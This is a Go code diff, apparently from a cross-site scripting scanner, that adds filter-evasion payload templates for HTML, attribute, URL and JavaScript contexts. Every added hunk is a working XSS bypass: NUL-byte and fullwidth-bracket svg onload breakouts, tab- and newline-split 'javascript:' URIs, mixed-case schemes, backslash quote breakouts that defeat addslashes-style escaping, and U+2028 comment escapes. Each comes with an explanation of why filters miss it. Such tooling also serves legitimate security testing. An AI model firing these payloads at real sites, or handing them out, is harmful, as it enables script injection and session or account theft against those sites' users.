@@ -46,6 +46,10 @@ func evasionTemplatesFor(a ContextAnalysis, m string) []candTemplate {
 		return htmlAttrEvasionTemplates(a, m)
 	case CatCSS:
 		return cssEvasionTemplates(a, m)
+	case CatURL:
+		return urlEvasionTemplates(a, m)
+	case CatJS:
+		return jsEvasionTemplates(a, m)
 	default:
 		return nil
 	}
@@ -84,6 +88,12 @@ func htmlTextEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
 		evasionTpl(prefix+"%3Csvg%20onload%3D"+m+"%3E", "", 15,
 			prefixReason(prefix, "percent-encoded breakout characters — the transport encodes this value AGAIN on the wire, so it only survives a target that decodes twice (e.g. a WAF that decodes once to inspect, then an app that decodes once more); opportunistic, not reliable"),
 			"double_url_encoding"),
+		evasionTpl("\x00"+prefix+"<svg onload="+m+">", "<>", 25,
+			prefixReason(prefix, "a leading NUL byte — some older/naive filters implemented in C-derived string functions (strcmp/regex engines that treat NUL as a terminator) stop matching at the NUL and never see the breakout that follows, while the browser's own HTML tokenizer does not treat NUL specially here and keeps parsing; many modern stacks strip NUL bytes before this point, so this is opportunistic, not reliable"),
+			"null_byte"),
+		evasionTpl(prefix+"\uff1csvg onload="+m+"\uff1e", "", 12,
+			prefixReason(prefix, "fullwidth Unicode angle brackets (U+FF1C/U+FF1E) instead of ASCII '<'/'>' — invisible to a filter matching the ASCII literal, and only becomes a real breakout if the target itself Unicode-normalizes (NFKC) the value back to ASCII before storing/rendering it; opportunistic, depends entirely on target-side normalization"),
+			"unicode_fullwidth"),
 	}
 }
 
@@ -105,6 +115,12 @@ func htmlAttrEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
 		evasionTpl(q+"><svg/onload="+m+">", breakoutNeeds, 48,
 			"break out of the attribute and tag, using '/' instead of a space before the attribute",
 			"alt_separator"),
+		evasionTpl("\x00"+q+"><svg onload="+m+">", breakoutNeeds, 24,
+			"a leading NUL byte ahead of the breakout — some naive, C-derived filter implementations stop matching at the NUL while the browser's HTML tokenizer keeps going; opportunistic, many stacks strip NUL before this point",
+			"null_byte"),
+		evasionTpl(q+"\uff1e\uff1csvg onload="+m+"\uff1e", breakoutNeeds, 11,
+			"fullwidth Unicode angle brackets (U+FF1C/U+FF1E) in place of ASCII '<'/'>' — invisible to an ASCII-literal filter; only a real breakout if the target Unicode-normalizes (NFKC) the value back to ASCII before storing/rendering; opportunistic",
+			"unicode_fullwidth"),
 	}
 }
 
@@ -116,5 +132,56 @@ func cssEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
 		evasionTpl("</StYle><svg onload="+m+">", "<>", 45,
 			"mixed-case closing tag — bypasses a filter matching only the lowercase literal \"</style>\"",
 			"case_variation"),
+	}
+}
+
+// urlEvasionTemplates targets the single most commonly filtered URL-category
+// construct: the javascript: scheme on an href/action/formaction-style sink.
+// Many filters block it by a literal, case-sensitive substring match on
+// "javascript:" — but per the WHATWG URL spec, a browser strips ASCII tab
+// and newline characters from a URL string BEFORE parsing its scheme, so
+// "java	script:" and "javascript:" parse identically. This is a real,
+// well-documented bypass, not theoretical obfuscation.
+func urlEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
+	if a.Sub != "start" && a.Sub != "relative_first_segment" {
+		return nil
+	}
+	return []candTemplate{
+		evasionTpl("java\tscript:"+m, "", 40,
+			"a tab inside the scheme name — the URL parser strips ASCII tab/newline from the whole URL before parsing it, so this parses identically to a plain javascript: URI, bypassing a filter doing a literal substring match on \"javascript:\"",
+			"alt_separator"),
+		evasionTpl("java\nscript:"+m, "", 38,
+			"a newline inside the scheme name — stripped by the URL parser the same way a tab is; bypasses the same literal-substring filters",
+			"alt_separator"),
+		evasionTpl("JaVaScRiPt:"+m, "", 36,
+			"mixed-case scheme name — URL schemes are case-insensitive to the browser, but bypasses a filter that only matches the lowercase literal \"javascript:\"",
+			"case_variation"),
+	}
+}
+
+// jsEvasionTemplates targets the two JS-category shapes most likely to face
+// a naive filter: a quoted-string breakout, and a line-comment breakout.
+func jsEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
+	switch {
+	case a.Context == CtxJSString && a.Sub == "single_quoted":
+		return []candTemplate{
+			evasionTpl(`\';`+m+"//", "'", 30,
+				"a leading backslash ahead of the breakout quote — a naive filter that does a single-pass replace of \"'\" with \"\\'\" to \"escape\" it is itself fooled: the attacker's own backslash absorbs that escaping (classic addslashes()-style bypass), so the filter's output still contains an unescaped, string-breaking quote",
+				"escaped_quote_prefix"),
+		}
+	case a.Context == CtxJSString && a.Sub == "double_quoted":
+		return []candTemplate{
+			evasionTpl(`\";`+m+"//", `"`, 30,
+				"a leading backslash ahead of the breakout quote — defeats a filter that naively single-pass-escapes quotes by prefixing them with a backslash, the same addslashes()-style bypass as the single-quoted case",
+				"escaped_quote_prefix"),
+		}
+	case a.Context == CtxJSComment && a.Sub != "block":
+		return []candTemplate{
+			evasionTpl("\u2028"+m, "", 18,
+				"U+2028 LINE SEPARATOR instead of a literal newline — the ECMAScript spec treats it as an equivalent line terminator ending a line comment, but a filter that only strips/blocks the ASCII \"\\n\" byte misses it",
+				"unicode_line_separator"),
+		}
+	default:
+		return nil
 	}
 }
